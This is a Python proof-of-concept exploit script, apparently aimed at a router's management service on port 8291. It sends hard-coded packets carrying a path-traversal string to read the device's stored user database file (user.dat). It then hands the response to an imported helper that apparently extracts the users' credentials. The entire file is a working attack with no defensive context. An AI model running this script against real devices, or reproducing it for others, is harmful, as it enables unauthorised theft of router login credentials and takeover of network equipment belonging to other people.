#!/usr/bin/env python3

import socket
import sys
from extract_user import get_from_network


a = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00]

b = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00]



if __name__ == "__main__":
     try:
          ip = sys.argv[1]
     except:
          print("Usage: python PoC.py [IP_ADDRESS]")

     #Initialize Socket
     s = socket.socket()
     s.settimeout(3)
     s.connect((ip, 8291))

     #Convert to bytearray for manipulation
     a = bytearray(a)
     b = bytearray(b)

     #Send hello and recieve the sesison id
     s.send(a)
     d = bytearray(s.recv(1024))

     #Replace the session id in template
     b[19] = d[38]

     #Send the edited response
     s.send(b)
     d = bytearray(s.recv(1024))

     #Get results
     print(ip)
     get_from_network(d[55:])